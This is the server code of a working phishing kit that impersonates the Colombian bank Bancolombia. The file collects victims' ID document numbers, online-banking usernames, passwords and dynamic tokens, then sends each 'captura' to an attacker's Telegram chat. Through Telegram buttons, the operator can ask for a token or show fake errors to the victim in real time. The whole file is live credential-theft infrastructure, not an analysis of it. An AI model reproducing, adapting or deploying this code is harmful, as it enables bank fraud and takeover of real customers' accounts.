require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SESSION_SECRET || 'bancol_secret_key_123',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: false,
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// Log only important requests
app.use((req, res, next) => {
    if (req.url.includes('/api/') && !req.url.includes('/api/check-action')) {
        console.log(`[${req.method}] ${req.url} - SID: ${req.sessionID}`);
    }
    next();
});

// Static files
app.use(express.static(path.join(__dirname, 'public')));

// Serve root index.html as main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Helpers
const formatSessionData = (sessionData) => {
    let message = "";

    if (sessionData.aviso) {
        message += `⚠️ <b>AVISO: ${sessionData.aviso}</b>\n`;
        message += "--------------------------------\n\n";
    }

    message += "🔔 <b>NUEVA CAPTURA - BANCOLOMBIA</b>\n\n";

    if (sessionData.documentType && sessionData.documentNumber) {
        message += "📋 <b>Documento</b>\n";
        message += `Tipo: ${sessionData.documentType}\n`;
        message += `Número: ${sessionData.documentNumber}\n\n`;
    }

    if (sessionData.usuario && sessionData.clave) {
        message += "🔐 <b>Credenciales</b>\n";
        message += `Usuario: ${sessionData.usuario}\n`;
        message += `Clave: ${sessionData.clave}\n\n`;
    }

    if (sessionData.token) {
        message += "🔑 <b>TOKEN DINÁMICO</b>\n";
        message += `Código: <code>${sessionData.token}</code>\n\n`;
    }

    if (sessionData.status) {
        message += `📍 <b>Estado:</b> ${sessionData.status}\n\n`;
    }

    message += "⏰ " + new Date().toLocaleString('es-CO');

    return message;
};

// API Endpoints
app.post('/api/process', (req, res) => {
    const { documentType, documentNumber } = req.body;
    req.session.documentType = documentType;
    req.session.documentNumber = documentNumber;
    req.session.telegram_stage = 'documento';
    req.session.currentAction = null;

    console.log(`[PROCESS] Doc: ${documentType} - ${documentNumber}`);
    req.session.save((err) => {
        if (err) console.error('Session Save Error:', err);
        res.json({ success: true });
    });
});

app.post('/api/send-message', async (req, res) => {
    const { stage, data } = req.body;

    // Accumulate data in session
    Object.assign(req.session, data);

    // Respond immediately to client
    res.json({ success: true });

    // Save session and send to Telegram asynchronously
    req.session.save(async (err) => {
        if (err) {
            console.error('Session Save Error:', err);
            return;
        }

        const message = formatSessionData(req.session);
        const sessionId = req.sessionID;

        const buttons = {
            inline_keyboard: [
                [
                    { text: '❌ Error Documento', callback_data: `error_documento:${sessionId}` },
                    { text: '✅ Pedir Logo', callback_data: `pedir_logo:${sessionId}` }
                ],
                [
                    { text: '❌ Error Logo', callback_data: `error_logo:${sessionId}` },
                    { text: '🔑 Pedir Token', callback_data: `pedir_token:${sessionId}` }
                ],
                [
                    { text: '❌ Error Token', callback_data: `error_token:${sessionId}` },
                    { text: '🏁 Finalizar', callback_data: `finalizar:${sessionId}` }
                ]
            ]
        };

        try {
            const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: process.env.TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: buttons
                })
            });
            console.log(`[✅ TELEGRAM] Mensaje enviado para SID: ${sessionId}`);
        } catch (error) {
            console.error('Telegram Error:', error);
        }
    });
});

// ===== SISTEMA ULTRA-SIMPLE DE ACCIONES =====
// Variable global Única para la última acción
global.currentAction = null;

// Polling de Telegram
let lastUpdateId = 0;
let isPolling = false;

const pollTelegram = async () => {
    if (isPolling) return;
    isPolling = true;
    
    try {
        console.log('🔍 Telegram polling...');
        const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
        const data = await response.json();

        if (data.ok && data.result.length > 0) {
            console.log(`📨 ${data.result.length} UPDATE(S) DE TELEGRAM`);
            
            for (const update of data.result) {
                lastUpdateId = update.update_id;

                if (update.callback_query) {
                    const callbackQuery = update.callback_query;
                    const [action, sessionId] = callbackQuery.data.split(':');
                    const messageId = callbackQuery.message.message_id;
                    const chatId = callbackQuery.message.chat.id;

                    console.log(`
🔴🔴🔴 BOTÓN PRESIONADO 🔴🔴🔴`);
                    console.log(`Acción: ${action}`);
                    console.log(`Sesión: ${sessionId}`);
                    console.log(`🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴
`);

                    // Guardar acción GLOBAL (cualquier cliente puede tomarla)
                    global.currentAction = action;
                    console.log(`✅ ACCIÓN GUARDADA: ${action}`);

                    // Responder a Telegram INMEDIATAMENTE
                    const botToken = process.env.TELEGRAM_BOT_TOKEN;
                    
                    // Responder al callback
                    fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            callback_query_id: callbackQuery.id,
                            text: '✅ Comando recibido'
                        })
                    }).catch(err => console.error('Error answerCallback:', err));

                    // Quitar botones
                    fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            reply_markup: { inline_keyboard: [] }
                        })
                    }).catch(err => console.error('Error editMarkup:', err));
                    
                    // Enviar confirmación
                    const actionNames = {
                        'error_documento': '❌ Error Documento',
                        'pedir_logo': '✅ Pedir Logo',
                        'error_logo': '❌ Error Logo',
                        'pedir_token': '🔑 Pedir Token',
                        'error_token': '❌ Error Token',
                        'finalizar': '🏁 Finalizar'
                    };
                    
                    const confirmMsg = `✅ <b>COMANDO EJECUTADO</b>\n\n📍 ${actionNames[action] || action}\n⏰ ${new Date().toLocaleTimeString('es-CO')}`;
                    
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: confirmMsg,
                            parse_mode: 'HTML'
                        })
                    }).catch(err => console.error('Error sendMessage:', err));
                }
            }
        }
    } catch (error) {
        console.error('❌ ERROR EN POLLING:', error.message);
    } finally {
        isPolling = false;
        // Continuar polling
        setTimeout(pollTelegram, 500);
    }
};

// API Endpoints
app.get('/api/check-action', (req, res) => {
    // Sistema ULTRA-SIMPLE: devolver la acción global si existe
    const action = global.currentAction;
    
    if (action) {
        console.log(`✅ CLIENTE RECOGIÓ ACCIÓN: ${action}`);
        // Limpiar la acción después de entregarla
        global.currentAction = null;
        res.json({ action });
    } else {
        // No hay acción pendiente
        res.json({ action: null });
    }
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({ 
        status: 'OK', 
        currentAction: global.currentAction,
        timestamp: new Date().toISOString()
    });
});



// Start Server
app.listen(PORT, () => {
    console.log(`\n${'='.repeat(50)}`);
    console.log(`🚀 SERVIDOR INICIADO EN PUERTO ${PORT}`);
    console.log(`${'='.repeat(50)}\n`);
    
    // Verificar variables de entorno
    if (!process.env.TELEGRAM_BOT_TOKEN) {
        console.error('❌ ERROR: TELEGRAM_BOT_TOKEN no configurado');
    } else {
        console.log('✅ TELEGRAM_BOT_TOKEN configurado');
    }
    
    if (!process.env.TELEGRAM_CHAT_ID) {
        console.error('❌ ERROR: TELEGRAM_CHAT_ID no configurado');
    } else {
        console.log('✅ TELEGRAM_CHAT_ID configurado');
    }
    
    console.log('\n🤖 Iniciando Telegram polling...\n');
    
    // Start Telegram polling
    pollTelegram();
    
    console.log('✅ Sistema listo. Esperando comandos de Telegram...\n');
});
